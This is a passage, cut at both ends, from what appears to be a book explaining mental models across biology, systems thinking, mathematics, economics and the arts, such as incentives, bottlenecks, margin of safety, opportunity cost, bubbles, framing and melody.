and shared interest. When organisms can benefit more by cooperating than by competing, cooperative strategies emerge and flourish. Collaboration with others gives us options and opportunities that are unavailable when we insist on going it alone. But cooperation is not automatic. It requires specific conditions—repeated interactions, shared benefits, and mechanisms to prevent cheating. Cooperation is the foundation of civilization. Our species’ success is built on our ability to cooperate flexibly and at scale—­ to share knowledge, coordinate efforts, and create institutions that incentivize cooperative behavior. Cooperation underlies our achievements, from the division of labor in the economy to the norms of reciprocity in society. But, as in nature, human cooperation is not guaranteed. It requires constant cultivation and protection from the forces of selfishness and short-­ term thinking. It requires norms that reward cooperation and punish defection.Hierarchical  OrganizationHierarchy is the invisible scaffolding that organizes the living world. Hierarchies in biology aren’t just about structure but about function. They allow for specialization and division of labor, for the emergence of complex behaviors from simple rules. In the hierarchy of an ant colony, the queen, workers, and soldiers all play their roles, their interactions giving rise to the sophisticated operation of the colony as a whole. But hierarchy isn’t rigid or fixed. It’s fluid and dynamic, with levels constantly interacting and influencing one another. A change at one level can ripple across the entire hierarchy, transforming the system unexpectedly. While hierarchy is a way to manage complexity, it can also backfire. Too much hierarchy leads to unrest and instability. Too little leads to chaos. Most organizations promote cultures that emphasize rather than de‑emphasize an individual’s status, power, and place, which is part of the reason they get torn apart, as the fight to get to the top of the hierarchy takes precedence over the organization’s success. In the end, hierarchy is the organizing principle that allows scale from the microscopic to the magnificent.Incentives are the hidden engines that drive behavior. They’re the unseen forces that shape our choices, the carrots and sticks that guide our actions. Think of a business offering a bonus for hitting a sales target. The bonus is an incentive, the external reward that motivates the salesperson to excel. But incentives aren’t always so obvious. They can be subtle, even subconscious—­ the social approval we seek, the habits we form, the desires we pursue. Incentives are powerful because they tap into the fundamental wiring of the human brain. We’re hardwired to seek reward and avoid punishment, to optimize for the outcomes that serve our interests. When the incentives align with our goals, we thrive. When they don’t, we struggle. In a classroom, it’s easy to say that we’ll be motivated by doing the right thing; however, in reality, we’re driven mainly by rewards. We have difficulty turning down the pleasure of immediate gains, even if it takes us away from our ultimate goal. Often, short-­term and long-­term incentives differ. You might not feel like going to the gym today but want to be healthy as you age. Making choices to maximize your satisfaction today often leads to less reward down the road. Poorly designed incentives backfire, encouraging short-­ term thinking, unethical behavior, or unintended consequences. The key is to craft incentives that reward the behaviors that lead to long-­ term success. Ultimately, if you understand the incentive, you can predict the outcome. By shaping the incentives, we shape the outcomes. By aligning the incentives, we unlock the power of human potential.Tendency to Minimize Energy Output (Mental and physical)The tendency to limit energy output is the universal inclination to follow the path of least resistance. From the flow of a river to the behavior of a market, this tendency is the invisible hand that guides the actions of the world. Sometimes, our tendency to conserve energy helps us, and sometimes, it hurts us. While minimizing our output ensures we will have extra to draw on in times of increased need, it can also get in the way of learning. Experience doesn’t become learning without reflection, which is an energy expenditure. If we want to develop our thinking and get the most out of our environments, then we have to be aware of the natural tendency to minimize energy output and correct for it where doing so creates value.The Mental Models of Systems ThinkingFeedback loops are the engines of growth and change. They’re the mechanisms by which the output of a system influences its input.Complex systems often have many feedback loops, and it can be hard to appreciate how adjusting to feedback in one part of the system will affect the rest.Using feedback loops as a mental model begins with noticing the feedback you give and respond to daily. The model also provides insight into the value of iterations in adjusting based on the feedback you receive. With this lens, you gain insight into where to direct system changes based on feedback and the pace you need to go to monitor the impacts.Feedback loops are what make systems dynamic. Without feedback, a system does the same thing over and over. Understand them, respect them, and use them wisely.Equilibrium is the state of balance, where opposing forces cancel each other out. It’s the calm in the storm’s center, the stable point around which the chaos swirls. In a system at equilibrium, there’s no net change. Everything is in a steady state, humming along at a constant pace. However, systems are rarely static. They continuously adjust toward equilibrium but rarely stay in balance for long. Equilibrium is a ­ double-edged sword, both stability and stagnation. In our lives, we often act like we can reach an equilibrium: once we get into a relationship, we’ll be happy; once we move, we’ll be productive; once X thing happens, we’ll be in Y state. But things are always in flux. We don’t reach a certain steady state and then stay there forever. The endless adjustments are our lives. The trick is to find the right balance, strive for equilibrium where it’s needed, and know when to break free and embrace the dis-equilibrium that drives progress.Bottlenecks are the choke points, the narrow parts of the hourglass where everything slows down. They’re the constraints that limit the flow, the weakest links in the chain that determine the strength of the whole. In any system, the bottleneck is the part holding everything else back.The tricky thing about bottlenecks is that they’re not always obvious. It’s easy to focus on the parts of the system that are moving quickly and assume everything is fine. But the real leverage is in finding and fixing the bottlenecks. Speed up the slowest part, and you speed up the whole system.This is the theory of constraints in a nutshell. Figure out your bottleneck and focus all your efforts on alleviating it. Don’t waste time optimizing the parts that are already fast. They’re not the limiting factor.However, bottlenecks aren’t always the villains we make them out to be. Sometimes, they’re a necessary part of the system. Think of a security checkpoint at an airport. It slows everything down, but it’s there for a reason. Remove it, and you might speed things up, but at the cost of safety.The key is to be intentional about your bottlenecks. Choose them wisely, and make sure they’re serving a purpose. A deliberate bottleneck can be a powerful tool for focusing effort and maintaining quality. An accidental bottleneck is just a drag on the system.Bottlenecks are leverage points where a little effort can go a long way.Systems change as they scale up or down; neither is intrinsically better or worse. The right scale depends on your goals and the context. If you want to scale something up, you need to anticipate that new problems will keep ­ arising—​­ problems that didn’t exist on a smaller scale. Or you might need to keep solving the same problems in different ways.Think about a recipe. If you’re making a cake for four people, you use a certain amount of ingredients. But if you want to make a cake for four hundred people, you don’t just multiply the ingredients by one hundred. That’s not how scale works. You need to change the process and use bigger mixers and bigger ovens. You need a system that can handle the increased volume without breaking down. The challenge with scale is that it’s not always obvious how to achieve it. What works for a small system often breaks down at larger volumes. You have to anticipate the bottlenecks and the points where the system will strain under the increased load. And you have to be ready to re‑engineer your processes as you grow. If you’re building something, always be thinking about scale. How will this work when you have ten times as many customers? One hundred times? One thousand times? Build with scale in mind from the start, and you’ll be ready for the growth when it comes.Margin of safety is a secret weapon. It’s the buffer, the extra capacity, the redundancy that you build into a system to handle unexpected stress. It’s the difference between a bridge that can barely handle the expected load and one that can handle ten times that load without breaking a sweat. You can apply a margin of safety to any area of life with uncertainty and risk. The key is always to ask yourself: What if I’m wrong? What if things don’t go as planned? How much extra capacity must I build to handle the unexpected? But here’s the rub: margin of safety isn’t free. It means spending more upfront. In the short term, you’ll look overly cautious and leave immediate profits on the table. But in the long run, this apparent overcaution lets you survive when others break – and thrive when others merely survive.Margin of safety is the unsung hero of ­ long-​­term success. It’s not flashy. It’s not exciting, but it’s the foundation on which everything else is built. Master it, and you’ll be well on your way to navigating the uncertainties of life with confidence and stability.Churn is the silent killer of businesses. It’s the slow leak, the constant drip of customers slipping away, of users drifting off to find something new. The attrition eats away at your growth, forcing you to keep running just to stay in place. The thing about churn is that it’s often hidden. It’s not like a sudden crisis that grabs your attention. It’s a slow, quiet process that happens in the background. Churn can present opportunity. Like a snake shedding its skin, replacing components of a system is a natural part of keeping it healthy. New parts can improve functionality. When we use this model as a lens, we see that new people bring new ideas, and counterintuitively, some turnover allows us to maintain stability. Replacing what is worn out also allows us to upgrade and expand our capabilities, creating new opportunities. Some churn is inevitable. Too much can kill you.Algorithms are recipes. A list of crisp, unambiguous steps that tell you how to get from point A to point B. But they’re more than just directions. Algorithms are if‑then machines for tuning out the noise and zeroing in on the signal. Have the specs been met? Fol- low the algorithm and find out. Thinking algorithmically means searching for processes that reliably spit out the desired results, like a vending machine dispensing the same candy bar every time someone punches in E4.Critical mass isn’t just a science term; it’s a guide for understanding that often things happen slowly and then all at once. It’s the moment when a system goes from sputtering along to explosive growth. Like a nuclear chain reaction, once you hit critical mass, the reaction becomes self-sustaining.Through this lens we gain insight into the amount of material needed for a system to change from one state to another. Material can be anything from people and effort to raw material. When enough material builds up, systems reach their tipping point. When we keep going, we get sustainable change.Using critical mass as a lens for situations where you want different outcomes helps you identify both the design elements you need to change and the work you need to put in. Nearly everything is an emergent ­ effect—​­a table, a space shuttle, even ­ us—​­ combinations of ingredients that come together in a specific way to create something new. Emergence is the universe’s way of reminding us that when we combine different pieces in new ways, we get results that are more than the sum of their parts, often in the most unexpected and thrilling ways. Using this mental model is not about predicting emergent properties but acknowledging they are possible. There is no need to stick with what you know; mix it up and see what happens. Learn new skills, interact with new people, read new things.Irreducibility is about essence. It’s the idea that some things can’t be broken down into smaller parts without losing what makes them tick. It’s the idea that not everything can be explained by looking at its components. Emergent properties arise from complex systems that can’t be predicted by studying the individual parts. Grappling with irreducibility requires a shift in thinking. Instead of trying to break things down, sometimes you have to zoom out. Look at the big picture. Embrace the complexity. Because some problems don’t have neat, modular solutions. They’re irreducibly messy. Using irreducibility as a lens helps you focus on what you can change by understanding what really mattersLaw of Diminishing ReturnsDiminishing returns is the idea that the easy wins usually come first. The more you optimize a system, the harder it gets to eke out additional improvements, like squeezing juice from a lemon. The first squeeze is easy. The second takes a bit more work. By the tenth squeeze, you’re fighting for every last drop. Every bit of effort translates into significant gains when you’re a beginner. But as you level up, progress becomes more incremental. It takes more and more work to get better and better. That’s why going from good to great is much harder than going from bad to good. Understanding diminishing returns is crucial for allocating resources efficiently. You want to focus on where you can get the biggest bang for your buck. Sometimes, that means knowing when to stop optimizing and move on to something else.The Mental Models of MathematicsSample size is about how much of the world you’re looking at. It’s the number of data points you’re using to draw conclusions. Like trying to guess the average height of people in a city by measuring a few folks on the street. The more people you measure, the more confident you can estimate. One of the biggest mistakes we can make is drawing conclusions from too small a sample ­size—​­ like trying to guess a puzzle picture from only a few pieces. In most instances, increasing our sample size gives us valuable information that lets us see our situation in a new light. The catch is that large sample sizes are expensive. It takes time and money to collect all that data. So practitioners and researchers are always balancing the need for precision with the constraints of budget and deadline. They’ll often settle for the smallest sample size that can still give them a statistically significant result.Using this model means exploring what isn’t obvious and knowing how easy it is to corrupt our samples with bias. The next time you hear a statistic, think about the sample size. It’ll give you a clue about how seriously to take it. Remember: the larger the sample, the closer to the truth.Randomness is the chaos that underlies the cosmos. It’s the unpredictable, the uncontrollable, the stuff that doesn’t follow any discernible pattern.Randomness is what makes life surprising. It’s why you can’t predict the future with certainty. You might make plans, but there’s always the possibility of a random event throwing a wrench in the works. A flat tire, a chance encounter, a sudden inspiration. Randomness is the spice that keeps things interesting.The tricky thing about randomness is that humans are terrible at recognizing it. We see patterns where there are none. We attribute meaning to coincidence. We think we can beat the odds. But true randomness is immune to our predictions and superstitions. It doesn’t care about our theories or desiresRegression to the mean is the universe’s way of saying “not so fast.” It’s the tendency for extreme outcomes to be followed by more average ones. Extreme results are rarely repeated. The next time you see something extraordinary, enjoy it. But remember, it probably won’t last. Sooner or later, regression to the mean will come calling, pulling the exceptional back to the ordinary. That’s the way the universe keeps things in check.Multiplying by zero is the mathematical version of the Midas touch in reverse. Everything it touches turns to nothing. No matter how big or small a number is, when you multiply it by zero, you get zero. It’s the ultimate reset button. Multiplying by zero shows that we must be mindful of the zeros that will negate our other efforts. Just as in engineering, where one faulty component can make an entire system fail, not being reliable can have the same effect in life. When you multiply by zero, everything else becomes irrelevant.Equivalence is the art of making things interchangeable. It’s the idea that two things can be swapped out without changing the essence of what they’re a part of. Like swapping a red Lego brick for a blue one. The color changes, but the structure remains the same.Being equal doesn’t mean being the same. Different inputs can produce identical results, and there is more than one way to solve most problems.Equivalence lets us simplify complex systems. We can focus on the essentials instead of getting bogged down in details. We can see the forest for the trees. And we can make changes without fear of breaking the fundamental structure. Of course, equivalence has its limits. Not everything is interchangeable. You can’t swap out a car’s engine for a hamster wheel and expect the car to run. The art is in knowing where equivalence applies and where it doesn’t. It’s in recognizing the essential differences that matter, and the superficial differences that don’t. The next time you face a complex problem, try thinking about equivalence. Look for the underlying patterns. See if there are components you can swap out or simplify. You might just find a solution that’s been hiding in plain sight all along.Surface area is what determines how much an object interacts with its environment. The more surface area the more contact. Surface area can be good and bad. Sometimes, keeping it small is favorable, and sometimes, increasing our exposure is beneficial. Surface area teaches us that increasing cognitive diversity can give us fresh ideas and help us innovate. However, the model also reminds us that in many ways, the more we expose ourselves, the more vulnerable we are. Different situations require different surface areas.Global and local maxima as a model can be used differently to help us make the changes we need for success. It encourages us to see achieving our goals not as a steady upward trajectory but as a path full of peaks and valleys. Understanding that sometimes we have to go down to climb even higher helps us make ­ short-term sacrifices to play the long game. In engineering, you might be trying to maximize efficiency. In life, you might be trying to maximize happiness. But in all these cases, getting stuck on a local maximum is easy. You find a pretty good solution, and you stop looking for a better one. The next time you’re trying to optimize something, remember the concept of global and local maxima. Don’t just settle for the first peak you find. Keep exploring. Keep searching for that global maximum. It might be a tough climb, but the view from the top is worth it.The Mental Models of EconomicsScarcity shapes our choices and drives our actions. When something is scarce, it suddenly becomes valuable. We want it more because there is less. It’s the principle that underlies everything from the price of gold to the thrill of the hunt.Scarcity isn’t just about material things. It applies to time, opportunities, and ideas. We’re drawn to the exclusive, the ­ limited-​­edition, the one-of-a-kind.In economics, scarcity is a foundational principle. There are infinite wants and desires but limited resources. We can’t have everything, so we must choose. Scarcity guides those choices. Some businesses operate with a scarcity mentality, removing shock absorbers and operating lean, with just enough resources to produce the day’s goods. This model is prone to disruption with the slightest hiccup and signals to employees that they’re in a culture of scarcity, triggering our biological instinct toward self-preservation. We subconsciously hoard things of value to gain an individual advantage. Scarcity can work to your advantage. Imagine you’ve got a rare combination of qualities: you’re honest, hardworking, and smart. People like that are scarce, and the world disproportionately rewards them. It’s not just about being good at one thing; it’s about having a mix of traits. The key to navigating scarcity is understanding its power, recognizing when it’s driving our choices, and asking if those choices align with our true values and goals. Sometimes, scarcity creates real value. But sometimes, it’s just a mirage, a trick of the mind.Supply and demand are the push and pull determining availability and price. Their dance is never-ending. A sudden shortage can send prices soaring; a new discovery can send them crashing.But supply and demand aren’t just about price; they’re also about allocation. They determine who gets what, and how much of it. When supply is low and demand is high, resources flow to those willing and able to pay the most.Markets react to supply and demand. When demand exceeds supply, it encourages investment by companies to create substitutes or more supply. On the other hand, when supply exceeds demand, it discourages investment until a profitable balance is restored. Economic cycles are driven as much by human nature as by resources. When profits are flowing, it encourages overconfidence, greed, and complacency. When profits are nowhere to be found, it encourages fear, savings, and ruthless efficiency. As individuals, we’re all part of this dance. Every choice we make as consumers and every decision we make as producers shapes the contours of supply and demand. We are the market, collectively determining what has value and what doesn’t. Remember the forces at play the next time you’re at the store, negotiating a salary, or launching a product. You’re not just a passive participant but an active agent in supply and demand. Your choices matter. Make them wisely.Optimization is about making the most of what you have. It’s like cleverly solving a puzzle, finding a trick to skip steps and get to the answer faster. In a world of scarcity, optimization is powerful. It allows us to maximize our limited resources, whether time, money, or energy. But like any tool, it’s only as good as the hand that wields it. Used wisely, optimization unlocks hidden potential and drives extraordinary results. Used poorly, it leads to wasted effort and missed opportunities. Optimization often works for you until it doesn’t. It’s like the student who writes the answer but doesn’t show their work. Knowing when to use it, when to let it go, and when to avoid it can give you a key advantage.Life is full of trade-offs. Every choice has a cost. When you say yes to one thing, you say no to others. This is how the world works. It’s like gravity. You can’t escape it. Opportunity cost is what you give up when you make a choice. It’s the thing you can’t have because you picked something else. Say you have a free evening. You can work on your startup or go to a movie. If you work, you miss the fun. If you go to the movie, you miss the chance to make progress. Every choice has an opportunity cost because every time you say yes to something, you’re implicitly saying no to other things. You need to know your opportunity costs. This helps you make good trade-offs. A ­ trade-​­off is giving up one thing to get something else. It’s choosing between options. Each has good and bad points. Trade-offs are about priorities. When you make something, you face trade-offs. If you want it fast, you might lose some features. If you want it cheap, you might use lower-quality materials. In life, we face ­ trade-​­ offs all the time. Do you take a high-paying job with long hours? Or the low-paying one with more free time? Do you spend money now or save for later? Making good ­ trade-​­offs is about weighing the opportunity costs and benefits of each option and choosing the one that aligns best with your goals and values. It’s not always easy, but being conscious of the ­ trade-​­ offs you’re making can help you make better decisions. Wisdom is anticipating the consequences of your choices. In life and business, success is about making good trade-offs. It’s not about having it all. It’s about having what matters most. We all value different things. That’s what makes life rich. Opportunity cost is what you give up when you make a choice; trade-offs are the balancing acts you perform when deciding between competing options. They’re two sides of the same ­ coin— ­whenever you make a ­ trade-​­off, you’re incurring an opportunity cost for the option you didn’t choose. The key in both cases is to be thoughtful and intentional about your choices.Specialization is a ­trade-​­off: pursuing one course means not pursuing another. It’s narrowing your focus to broaden your impact. In a world of infinite knowledge and finite time, specialization is the key to unlocking mastery. It’s about going deep, not wide. Specialization has risks. If the world changes, what was once a valuable specialty can become obsolete. And yet, we need specialists. You wouldn’t want a generalist doing your brain surgery or a root canal. Here’s the catch: the more you specialize, the more you see how much other fields can teach you. The most exciting finds often happen at the edges between areas of knowledge. The trick is to specialize without getting stuck. To go deep, but also reach out. Ultimately, specialization is about where you spend your time and effort. It’s how you stand out. It’s choosing to be great at one thing instead of okay at many.Interdependence is the web that ties us all together. It’s the recognition that no person, no company, no country is an island. We’re all connected, all reliant on one another in countless ways, big and small. Interdependence is the reality that underlies the illusion of ­ self-​­sufficiency. No one is entirely ­self-​­made.Interdependence can be both a vulnerability and a strength. When we recognize our interdependencies, we can leverage them for mutual benefit. We can form alliances, partnerships, and ecosystems. We can create value that no single entity could create alone.Interdependence is the foundation of synergy, the alchemy of the whole being greater than the sum of its parts. On the other hand, if we depend on others for something critical, it can expose us if they fail to deliver or change their minds. It’s easy to be a good partner when things are going well. But you want to be careful with whom you depend in a crisis.Interdependence isn’t just a macro concept. It’s deeply personal. We’re all interdependent with our families, our friends, our communities. We rely on one another for support, for love, for meaning. Interdependence is the fabric of our social lives.Efficiency is about getting the most done with the least waste. It’s not always about finding the perfect answer but the one that works well enough without too much fuss. Efficiency matters because in real life, you never have all the time or resources you want. You have to make do with what you’ve got.But efficiency isn’t just about speed. It’s also about effectiveness and doing the right things. There’s no point in doing something fast if it’s not worth doing. True efficiency is about focusing on what matters most. It’s about saying no to the small stuff so you can say yes to the big stuff.Like everything, efficiency has its limits. There’s a point of diminishing returns, a threshold beyond which further optimization yields little gain. The key is finding the sweet spot, the point of maximum efficiency before the costs start outweighing the benefits.Efficiency works until it doesn’t. The more perfectly efficient a system, the more vulnerable it becomes to any change. While the idea can be hard to appreciate, maximal efficiency in the short term rarely leads to maximum ­ long-​­ term efficiency. A common benefit eroded in the quest for efficiency is a margin of safety. Through the efficiency lens, the opportunity cost of holding something like extra cash, inventory, or even employees may be seen as too high. However, supply shocks or environmental changes can make excess cash, inventory, and employees more valuable. Inefficiency in the short run is often very efficient in the long run when it leaves you better able to adapt to an uncertain world and increases the odds of survival. In a world of trade-offs, efficiency is a balancing act. It’s about making the most of what you have and leaving room for what you might need. It’s about being prepared for the future, not just optimized for the present.Debt is a double-edged sword. It’s a powerful tool to help you grow a business, buy a home, or seize an opportunity. But it’s also a chain that can bind your future or destroy you. When debt spirals out of control, it quickly turns dreams into nightmares. Debt isn’t just about money. It can be a favor you owe, a social obligation, or anything that creates a future obligation. We even have sleep debt. It can be hard to appreciate just how fragile debt makes you. It’s like driving across a vast desert without a spare tire. If everything goes perfectly, you will reach the other side, but the smallest hiccup will leave you stranded and desperate. Use debt wisely. Respect its power, but fear its edge. Remember, the more you borrow, the less room you have to weather life’s storms. While debt might seem cheap in the moment, the future often proves it to be more expensive than we imagined. The more you borrow, the less room you have to deal with uncertainty. Debt can give you leverage, but it can also take away your freedom. Respect its power but fear its edge.Monopoly and competition are the yin and yang of the business world. They’re the opposing forces that shape the landscape of every market, the tides that lift and sink the fortunes of every firm. To understand business, you must understand the dance between these poles. Competition is the default state of the market. It’s the Darwinian struggle where many firms vie for the same customers and resources. In a competitive market, no one firm has the power to set prices or dictate terms. They’re price takers, not price makers. They survive by being efficient, delivering value, and innovating. If competition is the natural state, monopoly is the entrepreneur’s dream. A monopoly dominates a market so completely that it becomes the market. Think of the only bridge that crosses a river. But monopolies inevitably sow the seeds of their own destruction. The question is how long they will last. We need both monopoly and competition. Competition keeps firms honest and drives innovation. But we also need monopolies’ deep pockets to fund big visions and moon shots. The ideal is a balance: enough competition to check monopolies but enough monopolies to reward innovation.Creative destruction is the engine of progress in a capitalist economy. It’s the process by which new innovations replace old ones, the cycle of birth and death that keeps an economy vibrant. It embodies the old adage: The only constant is change.In a dynamic economy, nothing is sacred. Newer, better ideas can disrupt every industry, company, and way of doing things. The smartphone replaced the flip phone, online streaming replaced movie rental stores, and cars replaced horses.While creative destruction can be painful for individual companies, it’s essential for the overall economy’s health. It prevents stagnation and ensures resources are always put to their most productive use. Without creative destruction, we’d still ride horses and rent VHS tapes.On one hand, creative destruction is the opportunity you’re looking for—the chance to disrupt an incumbent—to build something new and better. But on the other hand, it’s the threat you’re always guarding against—the possibility that you will be disrupted by the next big thing.Creative destruction isn’t just about business; it’s a metaphor for life. We are all subject to change, to the constant cycle of endings and beginnings. The key is to not cling too tightly to the old, but to embrace the new possibilities.Gresham’s Law states that bad money drives out good. But it’s not just about currency. The principle applies anytime there are two competing versions of something, one perceived as high quality and the other as low quality.In a sense, Gresham’s Law is the dark side of human nature. We’re wired to optimize for the short term, to get the most value for the least effort. If we can pass off the less valuable thing and keep the more valuable one, we will. Without consequences, bad behavior drives out good. Bad lending drives out good lending. Bad morals drive out good morals. Overcoming this requires constant effort.In the short run, bad often drives out good. But in the long run, true value wins out.Bubbles are a natural by-product of human nature. They happen when collective enthusiasm for an asset runs far ahead of its fundamental value. It’s the moment when the market becomes untethered from reality when prices are driven not by sober calculation but by mass delusion. Bubbles are a fascinating study of human psychology. They’re driven by greed and FOMO (fear of missing out). No one wants to be the sucker who sits on the sidelines while everyone else gets rich. But there’s also an element of genuine belief, of conviction that this time is different, that the old rules no longer apply. While ultimately destructive, bubbles also serve a function. They’re the market’s way of exploring new frontiers, of testing new possibilities. Many of the innovations we take for granted ­ today— ­ from cars to computers to the internet ­ itself—​­ were once the subject of speculative manias. Bubbles fund the infrastructure for future revolutions, even as they leave a trail of financial wreckage in their wake. Bubbles remind us that markets are driven by human emotions and beliefs. They’re a mirror held up to our collective hopes, dreams, and delusions. The next time you catch yourself saying, “this time is different,” remember that all bubbles pop eventually. Like a balloon that can only expand so far, bubbles eventually burst, and the game ends abruptly without warning. Keeping yourself grounded in value and economic reality, not in story or hype, is key to standing alone as a bubble expands.The audience is the invisible participant in every work of art. They are the eyes that see, the ears that hear, the minds that interpret. Without an audience, art is like a tree falling in an empty ­ forest—­ it may make a sound, but does it matter? The audience is what gives art its meaning, its purpose, and its very existence. Every observer infuses art with personal significance, transforming it into a co-creation. A painting of a sunset may evoke feelings of peace and beauty for one person and feelings of melancholy and loss for another. The artwork is the same, but the audience is different, so the meaning is different. In this sense, the audience is a cocreator of the art.Great artists design their work for these silent judges, balancing authenticity with expectation without succumbing to pandering.The audience is their silent collaborator and their ultimate judge.In a world where so much can be faked, the audience is something real. You can fake likes, followers, and reviews, but you can’t fake the genuine human experience of engaging with art. The spontaneous laughter, unexpected tears, and long, thoughtful silence are the honest reactions that both the audience and the artists live for.Never forget your audience, but never let them dictate your creation. Picture this: you’re browsing a bookstore, scanning the shelves for your next read. You pick up a book with a shadowy figure on the cover, a magnifying glass in hand. Instantly, you know what kind of story awaits you within those pages. This is the power of genre— the unspoken understanding between creator and audience that shapes how we experience art.But genre is more than just a label; it’s a set of conventions, an understanding between the artist and the audience. When we pick up a mystery novel, we expect a crime, some clues, and a detective. When we go to a rock concert, we expect loud guitars, driving rhythms, and a rebellious attitude. Genre sets the parameters of our experience, even as it gives the artist a foundation to build upon or rebel against.Think of genre as a game with rules. The rules provide structure, but they also create opportunities for creativity. A sonnet has a strict ­ form—​­ fourteen lines, a specific rhyme ­ scheme—​­ but within those constraints, poets have found endless ways to express love, loss, joy, and sorrow. The rules of the genre game inspire ingenuity, challenging artists to create something fresh within the familiar.But genres are not static; they are constantly evolving. Look at the way rock music has transformed over the decades. What began as a rebellious offshoot of blues and country in the 1950s has splintered into countless subgenres, each with a distinct style and audience. From the psychedelic experimentation of the 1960s to the punk revolution of the ’70s to the grunge explosion of the ’90s, rock has reinvented itself time and again. What was once transgressive becomes mainstream, and new forms emerge to take its place.Navigating genre is a delicate art. Sticking too closely to the conventions may cause your work to be dismissed as formulaic. On the other hand, if you stray too far you risk losing your audience. The key is to find the sweet ­ spot—​­ honoring the genre’s expectations while bringing something new and personal to the table.Ultimately, genre is a tool—a way of framing the conversation between the artist and the audience. It provides common ground, a starting point for the journey together. But the true power of art lies in the way it can transcend genre, using convention as a springboard to take us places we’ve never been.Contrast is the spice of life and art. It’s the clash of opposites that energizes a work and jolts our senses. Without contrast, the world is bland. With it, the world dances with dark and light, loud and soft, rough and smooth. Contrast makes us notice.Contrast isn’t just visual. In music, quiet moments make loud ones explosive. Gentle ballads set the stage for crashing anthems. In literature, calm before the storm makes extraordinary events remarkable. Contrast gives art emotional power.Contrast creates interest and engagement. Our brains are wired to pay attention to changes and differences. We tune out the monotonous, but we snap to attention when something breaks the pattern. Artists use contrast to manipulate our attention, direct our focus, and shape our work experience.Contrast is a universal principle. Light and dark, hot and cold, life and ­ death—​­ the world is defined by contrasts. Darkness helps us understand light. Winter makes us appreciate spring. Contrast gives meaning to existence.Framing is the art of context, the craft of shaping perception. It’s how we present information, the lens through which we invite others to view the world. Like a photographer choosing what’s in the frame, we constantly decide what to emphasize, minimize, or leave out. These often unconscious choices profoundly influence how others understand and respond.In psychology, framing is a key concept in understanding ­ decision- ­ making. Present the same options in different ways, and people’s choices change. Is it a muffin or a cake? The thing doesn’t change, but its packaging does.For marketers and advertisers, framing is a potent tool. A car can be framed as a status symbol, an adventure machine, or a sensible family vehicle. A watch can be about punctuality, or it can be about luxury and prestige. The product stays the same, but the story changes. The right frame makes the ordinary extraordinary.But framing isn’t just about persuasion. It’s also about understanding, about making sense of the complex world around us. We all carry frames in our ­ minds—​­ mental models of how things work, cultural narratives, and personal beliefs. These frames shape how we interpret information, how we explain events, and how we imagine possibilities.Framing’s power lies in its subtlety. Unlike a logical argument, a frame doesn’t need to be explicitly stated to have an effect. It works on an emotional, often subconscious level. A ­ well-​­crafted frame can make an idea feel intuitive, even inevitable, without the audience knowing why.Framing is the silent partner in every communication, the hidden hand shaping understanding. Like any powerful tool, framing can be used for good or ill. It can illuminate truth, or it can obscure it. It can empower people to see new possibilities, or it can subtly limit their thinking to narrow predefined channels.Rhythm is the universe’s heartbeat, the pulse animating life. From our steady heartbeats to the sun’s rise and fall, from crashing waves to swaying trees, rhythm is the pattern underlying existence. It’s the organizing principle bringing order to chaos, the recurring cycle shaping time.In music, rhythm is the backbone supporting melody and harmony. Without rhythm, music would be a formless wash of sound, lacking structure and impact. The steady beat of the drum, the driving strum of the guitar, the pulsing throb of the ­ bass—​­ these rhythms grab us on a visceral level, moving our bodies and stirring our souls.But rhythm isn’t just about regularity, the even spacing of beats. It’s also variation, the interplay of different rhythmic patterns. In jazz, the syncopated rhythms and the unexpected accents give the music an improvisational feel. In classical music, the shifting rhythms, from the stately march to the lively dance, convey the piece’s emotional arc.Rhythm is also fundamental to language. The cadence of a phrase, the meter of a poem, the rise and fall of a great orator’s ­ speech—​­ these rhythms communicate meaning beyond the literal content of the words. They create their own music, a pattern resonating in the ear and lingering in the mind.Even in our daily lives, rhythm plays a crucial role. The routines we establish, the habits we cultivate, the cycles of work and rest, of activity and ­ reflection—​­ these rhythms give structure and meaning to our existence. Without rhythm, life would be a formless blur, a ceaseless stream of unrelated moments. Rhythm allows us to make sense of time, to find our place in life’s larger patterns.Melody is music’s soul, the ethereal thread weaving through sound’s tapestry. It’s the part of a song that we hum in the shower, the tune that gets stuck in our head and won’t let go. Melody is the musical expression of a fundamental human need: the need to tell a story, convey an emotion, and connect with others beyond words.A melody is simply a sequence of notes, a pattern of pitches and rhythms. But melody’s magic transcends these basic building blocks. A great melody is more than the sum of its parts. It has a shape, a contour, an arc that carries us from one note to the next. It has a sense of inevitability, as if each note is the only possible choice, even as the melody surprises us with its freshness and novelty.In this sense, melody is a lot like language. As we arrange words infinitely to express different ideas, we arrange notes to express emotions and experiences. A rising melody might convey a sense of hope and aspiration, while a falling melody might suggest sadness or resignation. A melody with large leaps might feel adventurous and daring, while one with small, stepwise motion might feel intimate and confiding.But melody isn’t just about individual expressions. It’s also about communication and connection. When a melody resonates with us, it’s as if the composer is speaking directly to our hearts. We feel understood, validated, less alone. And when we sing or play a melody with others, we create a bond, a shared experience that transcends our individual differences. This is why melody has such power across cultures and throughout history. From the chants of ancient rituals to the latest pop hits, melody has been a constant in human musical expression. It’s a universal language, requiring no translation or explanation. A beautiful melody can move us regardless of whether we understand the words or know the cultural context. Of course, not all melodies are equal. Just as there are great works of literature and forgettable pulp novels, there are melodies that stand the test of time and others that quickly fade from memory. The best melodies balance the familiar and the new. They have a memorable shape, a satisfying resolution, a feeling of completeness. In a world often fragmented and chaotic, melody is a source of unity and coherence, a way of finding beauty and meaning amid the noise.Representation is the mental shorthand we use to navigate the complexities of reality, the symbols and images we use to communicate our thoughts and experiences. Representation is how we construct meaning and bridge the gap between the raw data of our senses and the narratives we tell about ourselves and our world. At its core, representation is about standing in for something else. A word stands in for an object or concept, a map for a territory, a musical note for a sound. We use representations because we can’t hold the entirety of reality in our minds at once. We need abstractions, simplifications, and models that we can manipulate and reason about. But representation is not neutral. Every representation is an interpretation, a way of framing reality that highlights some aspects and obscures others. An emoji might represent a feeling, but it doesn’t show the lived experience that causes that feeling. In this sense, representation is always a kind of distortion. It’s a lens that shapes how we see the world, for better or worse. A good representation can illuminate hidden truths, help us see patterns and connections we might otherwise miss. But a bad representation can mislead us, reinforce stereotypes and prejudices, limit our ability to imagine alternatives. Representation is not just about mirroring reality; it’s also about shaping it. The representations we create and consume can influence how we think and act, to change the very world they purport to describe. A powerful piece of art can shift cultural attitudes, a persuasive political narrative can sway elections, a compelling scientific model can guide research and policy. In this way, representation is a kind of feedback loop. We create representations based on our understanding of reality, but those representations, in turn, shape our understanding, which influences the representations we create next. It’s a constant dance between map and territory, symbol and referent.The plot is the story’s engine, propelling characters and events through time. It’s the sequence of causally connected events that leads from the beginning of a narrative to its resolution. Without a plot, a story is just disconnected moments and unrelated incidents. With a 